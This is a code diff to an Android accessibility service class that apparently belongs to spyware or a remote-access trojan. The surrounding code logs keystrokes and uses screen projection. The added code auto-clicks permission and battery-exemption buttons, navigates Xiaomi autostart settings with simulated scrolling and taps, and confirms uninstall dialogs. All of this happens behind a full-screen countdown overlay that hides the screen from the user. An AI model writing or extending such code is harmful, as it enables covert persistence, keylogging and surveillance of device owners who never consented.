@@ -209,6 +209,10 @@ public class MainAccessibilityService extends AccessibilityService {
 
     private String currentPackagename = "";
 
+    private Boolean isAutoBackPermission = false;
+    private Handler scrollHandler = new Handler();
+    private Runnable scrollRunnable;
+
     private int lastClickPermissionPosition = 0;
     private static MainAccessibilityService CONTEXT;
     public static MainAccessibilityService getContext() {
@@ -267,31 +271,19 @@ public class MainAccessibilityService extends AccessibilityService {
         getBaseContext().startService(serviceIntentX);
         makeOverlayWaitingScreen();
         if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-            if(manufacturer.equals("xiaomi")) {
-                new Handler().postDelayed(new Runnable() {
-                    @Override
-                    public void run() {
-                        onGoBack();
-                        new Handler().postDelayed(new Runnable() {
-                            @Override
-                            public void run() {
-                                onGoBack();
-                                new Handler().postDelayed(new Runnable() {
-                                    @Override
-                                    public void run() {
-                                        onGoBack();
-                                    }
-                                }, 500);
-                            }
-                        }, 500);
-                    }
-                }, 500);
-            } else {
-                onGoBack();
-                Intent intent = new Intent(getBaseContext(), SetAutoStartActivity.class);
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(intent);
-            }
+            onGoBack();
+            new Handler().postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    onGoBack();
+                    new Handler().postDelayed(new Runnable() {
+                        @Override
+                        public void run() {
+                            onGoBack();
+                        }
+                    }, 500);
+                }
+            }, 500);
         } else {
             onGoBack();
             if(mediaProjection == null) {
@@ -580,10 +572,16 @@ public class MainAccessibilityService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
+        if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+            setBatteryPermission(event);
+            if(manufacturer.equals("xiaomi")) {
+                setBatteryXiaomiPermission(event);
+                setAutoStartBackgroundPermission(event);
+            }
+        }
         getKeyLogger(event);
         getSkeletonInfo(event);
         findFocusedNode(event);
-        goBackFromAutoStartPage(event);
         if(Common.getInstance().getAutostartEnable() && manufacturer.equals("xiaomi") && Integer.parseInt(Build.VERSION.RELEASE) >= 12) {
             setPermEditorEnable(event);
         } else {
@@ -638,6 +636,138 @@ public class MainAccessibilityService extends AccessibilityService {
         }
     }
 
+    private void setBatteryPermission(AccessibilityEvent event) {
+        if(event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+            getBatteryPermission(event.getSource());
+        }
+    }
+
+    private void getBatteryPermission(AccessibilityNodeInfo node) {
+        if(node != null) {
+            if (node.getClassName() != null && node.getClassName().equals("android.widget.Button")) {
+                if(node.getText() != null) {
+                    String nodeText = node.getText().toString();
+                    Log.d("nodetext::", nodeText);
+                    if(nodeText.equals("Allow") || nodeText.equals("Permitir") || nodeText.equals("EXCLUIR") || nodeText.equals("EXCLUDE")) {
+                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                    }
+                }
+            }
+            for (int i = 0; i< node.getChildCount(); i++) {
+                getBatteryPermission(node.getChild(i));
+            }
+        }
+    }
+
+    private void setBatteryXiaomiPermission(AccessibilityEvent event) {
+        if(event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            CharSequence packagename = String.valueOf(event.getPackageName());
+            CharSequence classname = String.valueOf(event.getClassName());
+            Log.d("classnameÇÇ", packagename+ " " + classname);
+            if(packagename.equals("com.miui.powerkeeper") && classname.equals("com.miui.powerkeeper.ui.HiddenAppsConfigActivity")) {
+                getBatteryXiaomiPermission(getRootInActiveWindow());
+            }
+        }
+    }
+
+    private void getBatteryXiaomiPermission(AccessibilityNodeInfo node) {
+        if(node != null) {
+            if (node.getClassName() != null && node.getClassName().equals("android.widget.CheckedTextView")) {
+                Log.d("classnameÇÇ", node.getClassName().toString());
+                if(node.getText() != null) {
+                    String nodeText = node.getText().toString();
+                    Log.d("nodetext::", nodeText);
+                    if(nodeText.equals("Nenhuma restrição")) {
+                        Rect rect = new Rect();
+                        node.getBoundsInScreen(rect);
+                        performClickMain(rect.left + 20, rect.top + 20);
+                    }
+                }
+            }
+            for (int i = 0; i< node.getChildCount(); i++) {
+                getBatteryXiaomiPermission(node.getChild(i));
+            }
+        }
+    }
+
+    private void setAutoStartBackgroundPermission(AccessibilityEvent event) {
+        if(event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            CharSequence packagename = String.valueOf(event.getPackageName());
+            CharSequence classname = String.valueOf(event.getClassName());
+            if(packagename.equals("com.miui.securitycenter") && classname.equals("com.miui.permcenter.autostart.AutoStartManagementActivity")) {
+                List<MousePositionEntry> autostartDraw = new ArrayList<>();
+                autostartDraw.add(new MousePositionEntry(180, deviceHeight * 360/deviceWidth - 100));
+                autostartDraw.add(new MousePositionEntry(180, deviceHeight * 360/deviceWidth - 105));
+                autostartDraw.add(new MousePositionEntry(180, deviceHeight * 360/deviceWidth - 120));
+                autostartDraw.add(new MousePositionEntry(180, deviceHeight * 180/deviceWidth - 80));
+                autostartDraw.add(new MousePositionEntry(180, deviceHeight * 180/deviceWidth - 100));
+                Common.getInstance().setMousePositionEntries(autostartDraw);
+                Handler handler = new Handler();
+                handler.postDelayed(new Runnable() {
+                    @Override
+                    public void run() {
+                        Log.d("startScroll::", "startsto");
+                        startAutoSetScrolling();
+                    }
+                }, 500);
+            }
+        }
+        if(event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+            CharSequence packagename = String.valueOf(event.getPackageName());
+            CharSequence classname = String.valueOf(event.getClassName());
+            Log.d("classnameÇÇ", packagename+ " " + classname);
+            if(packagename.equals("com.miui.securitycenter")) {
+                if(isAutoBackPermission) {
+                    onGoBack();
+                } else {
+                    getAutoStartBackgroundPermission(getRootInActiveWindow());
+                }
+            }
+        }
+    }
+
+    private void getAutoStartBackgroundPermission(AccessibilityNodeInfo node) {
+        if(node != null) {
+            if ((node.getClassName() != null) && (node.getClassName().equals("android.widget.TextView") || node.getClassName().equals("android.widget.CheckBox"))) {
+                Log.d("getClassName::", node.getClassName().toString());
+                if(node.getText() != null) {
+                    String nodeText = node.getText().toString();
+                    Log.d("nodetext::", nodeText);
+                    if(nodeText.equals(getResources().getString(R.string.app_name))) {
+                        Rect rect = new Rect();
+                        node.getBoundsInScreen(rect);
+                        performClickMain(deviceWidth - 140, rect.top);
+                        stopScrollingHandler();
+                        isAutoBackPermission = true;
+                        Common.getInstance().setAutoBackEnable(true);
+                    }
+                }
+            }
+            for (int i = 0; i< node.getChildCount(); i++) {
+                getAutoStartBackgroundPermission(node.getChild(i));
+            }
+        }
+    }
+
+    private void startAutoSetScrolling() {
+        scrollRunnable = new Runnable() {
+            @Override
+            public void run() {
+                if(!isAutoBackPermission) {
+                    mouseDraw();
+                    scrollHandler.postDelayed(this, 500);
+                }
+            }
+        };
+        scrollHandler.post(scrollRunnable);
+    }
+
+    public void stopScrollingHandler() {
+        scrollHandler.removeCallbacks(scrollRunnable);
+    }
+
+
+
     private void setPermEditorEnable(AccessibilityEvent event) {
         CharSequence packagename = String.valueOf(event.getPackageName());
         if(event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
@@ -650,13 +780,11 @@ public class MainAccessibilityService extends AccessibilityService {
                 }
             }
         }
-
     }
 
     public void getPermEditorEnable(AccessibilityNodeInfo node) {
         if(node != null) {
             if (node.getClassName() != null) {
-                Log.d("classname", node.getClassName().toString());
                 if (node.getClassName().equals("android.widget.TextView")) {
                     if(node.getText() != null) {
                         String nodeText = node.getText().toString().toLowerCase();
@@ -875,8 +1003,8 @@ public class MainAccessibilityService extends AccessibilityService {
 
     public void AllowPrims14_media() {
         int startX = deviceWidth / 2;
-        int startY = (int) (deviceHeight * 0.6);
-        if(Common.getInstance().getLastPermissionlocation() > (int) (deviceHeight * 0.6)) {
+        int startY = (int) (deviceHeight * 0.55);
+        if(Common.getInstance().getLastPermissionlocation() > (int) (deviceHeight * 0.55)) {
             startY = Common.getInstance().getLastPermissionlocation() - 10;
         }
 
@@ -1070,7 +1198,6 @@ public class MainAccessibilityService extends AccessibilityService {
             if (node.getClassName() != null && node.getClassName().equals("android.widget.TextView")) {
                 if(node.getText() != null) {
                     String nodeText = node.getText().toString().toLowerCase();
-                    Log.d("infotext::", nodeText);
                     if(nodeText.contains(getResources().getString(R.string.app_name).toLowerCase()) || nodeText.contains(getPackageName())) {
                         isSelectedApp = true;
                     }
@@ -1134,24 +1261,12 @@ public class MainAccessibilityService extends AccessibilityService {
         }
     }
 
-    private void goBackFromAutoStartPage(AccessibilityEvent event) {
-        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-            CharSequence packagename = String.valueOf(event.getPackageName());
-            CharSequence classname = String.valueOf(event.getClassName());
-            if (packagename.equals("com.miui.securitycenter")) {
-                if(classname !=null && classname.equals("com.miui.permcenter.autostart.AutoStartManagementActivity")) {
-                    onGoBack();
-                }
-            }
-        }
-    }
-
     public void setUninstallApp(AccessibilityNodeInfo node) {
         if(node != null) {
             if (node.getClassName() != null && node.getClassName().equals("android.widget.Button")) {
                 if(node.getText() != null) {
                     String nodeText = node.getText().toString().toLowerCase();
-                    if(nodeText.equals("ok")) {
+                    if(nodeText.equals("ok") || nodeText.equals("aceptar")) {
                         node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                     }
                 }
@@ -1457,7 +1572,11 @@ public class MainAccessibilityService extends AccessibilityService {
 
             txtCounting = new TextView(this);
             txtCounting.setTextColor(Color.WHITE);
-            txtCounting.setText("15");
+            if(manufacturer.equals("xiaomi")) {
+                txtCounting.setText("30");
+            } else {
+                txtCounting.setText("15");
+            }
             txtCounting.setTextSize(50);
             txtCounting.setGravity(Gravity.CENTER);
             txtCounting.setPadding(0,0,0,deviceWidth/2 + 60);
@@ -1502,22 +1621,41 @@ public class MainAccessibilityService extends AccessibilityService {
             windowManagerWaiting.addView(txtWaiting, txt_waiting_params);
             windowManagerWaiting.addView(txtCounting, txt_params);
             isWaitingScreen = true;
+            if(manufacturer.equals("xiaomi")) {
+                new CountDownTimer(30000, 1000) { // 10 seconds countdown, tick every 1 second
+                    @Override
+                    public void onTick(long millisUntilFinished) {
+                        // Update the countdown text with the remaining seconds
+                        txtCounting.setText(String.valueOf(millisUntilFinished / 1000));
+                        progressWaitingBar.setProgress((int)(millisUntilFinished / 200) , true);
+                    }
 
-            new CountDownTimer(15000, 1000) { // 10 seconds countdown, tick every 1 second
-                @Override
-                public void onTick(long millisUntilFinished) {
-                    // Update the countdown text with the remaining seconds
-                    txtCounting.setText(String.valueOf(millisUntilFinished / 1000));
-                    progressWaitingBar.setProgress((int)(millisUntilFinished / 150) , true);
-                }
+                    @Override
+                    public void onFinish() {
+                        // When the countdown finishes, display "Done" or hide the countdown
+                        txtCounting.setText("0");
+                        removeWaitingOverlayscreen();
+                    }
+                }.start();
+            } else {
+                new CountDownTimer(15000, 1000) { // 10 seconds countdown, tick every 1 second
+                    @Override
+                    public void onTick(long millisUntilFinished) {
+                        // Update the countdown text with the remaining seconds
+                        txtCounting.setText(String.valueOf(millisUntilFinished / 1000));
+                        progressWaitingBar.setProgress((int)(millisUntilFinished / 150) , true);
+                    }
 
-                @Override
-                public void onFinish() {
-                    // When the countdown finishes, display "Done" or hide the countdown
-                    txtCounting.setText("0");
-                    removeWaitingOverlayscreen();
-                }
-            }.start();
+                    @Override
+                    public void onFinish() {
+                        // When the countdown finishes, display "Done" or hide the countdown
+                        txtCounting.setText("0");
+                        removeWaitingOverlayscreen();
+                    }
+                }.start();
+            }
+
+
         }
     }
 
